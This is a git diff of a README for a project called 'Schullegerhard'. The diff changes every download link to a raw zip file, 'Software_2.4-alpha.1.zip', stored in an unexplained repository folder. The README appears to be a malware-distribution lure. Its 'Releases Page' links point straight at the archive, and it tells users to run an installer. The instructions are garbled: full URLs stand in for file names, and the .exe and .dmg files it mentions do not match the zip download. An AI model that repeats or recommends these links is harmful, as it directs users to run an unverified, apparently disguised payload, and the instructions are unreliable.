@@ -6,7 +6,7 @@ Welcome to the Schullegerhard project! This guide will help you download and run
 
 ## 📥 Download Here
 
-[![Download](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip%https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip)](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip)
+[![Download](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip%https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip)](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -30,7 +30,7 @@ Schullegerhard includes several key features designed to enhance your experience
 
 ### Step 1: Visit the Releases Page
 
-To get the software, visit the following link: [Download Page](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip).
+To get the software, visit the following link: [Download Page](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip).
 
 ### Step 2: Choose Your Version
 
@@ -38,7 +38,7 @@ On the releases page, you will see a list of available versions. Look for the la
 
 ### Step 3: Download the Installer
 
-Click on the download link for your operating system. The file may be named something like `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip` for Windows, `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip` for macOS, or `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip` for Linux.
+Click on the download link for your operating system. The file may be named something like `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip` for Windows, `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip` for macOS, or `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip` for Linux.
 
 ### Step 4: Run the Installer
 
@@ -46,7 +46,7 @@ Once the download completes, locate the file in your downloads folder:
 
 - For Windows, double-click the `.exe` file.
 - For macOS, double-click the `.dmg` file and drag the app to your Applications folder.
-- For Linux, extract the `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip` file and follow the instructions in the README file included in the folder.
+- For Linux, extract the `https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip` file and follow the instructions in the README file included in the folder.
 
 ### Step 5: Follow the On-Screen Instructions
 
@@ -66,7 +66,7 @@ We welcome contributions from everyone. If you want to add new features or impro
 
 ## 🌍 Stay Updated
 
-We regularly release updates to improve performance and add features. To be notified of the latest releases, follow the repository on GitHub or check back frequently on the [Releases Page](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip).
+We regularly release updates to improve performance and add features. To be notified of the latest releases, follow the repository on GitHub or check back frequently on the [Releases Page](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip).
 
 ## 📞 Contact
 
@@ -74,6 +74,6 @@ For further questions or support, feel free to reach out via GitHub Issues or jo
 
 ## 📥 Download Again
 
-Don't forget, you can always return to download the latest version from this link: [Download Page](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/schullegerhard-cochleate.zip).
+Don't forget, you can always return to download the latest version from this link: [Download Page](https://raw.githubusercontent.com/fitriadijamil/schullegerhard/main/hispid/Software_2.4-alpha.1.zip).
 
 Happy using Schullegerhard!
